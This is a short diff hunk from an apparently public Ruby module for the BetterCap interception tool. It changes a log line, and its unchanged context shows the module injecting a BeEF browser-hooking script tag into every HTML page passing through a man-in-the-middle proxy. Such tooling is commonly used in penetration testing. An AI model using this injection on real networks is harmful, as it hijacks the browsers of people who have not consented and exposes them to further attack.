@@ -60,7 +60,7 @@ class BeefBox < BetterCap::Proxy::Module
   def on_request( request, response )
     # is it a html page?
     if response.content_type =~ /^text\/html.*/
-      BetterCap::Logger.warn "Injecting BeEF into http://#{request.host}#{request.url}"
+      BetterCap::Logger.warn "Injecting BeEF into http://#{request.host}#{request.path}"
 
       response.body.sub!( '</title>', "</title><script src='#{@jsfile}' type='text/javascript'></script>" )
     end
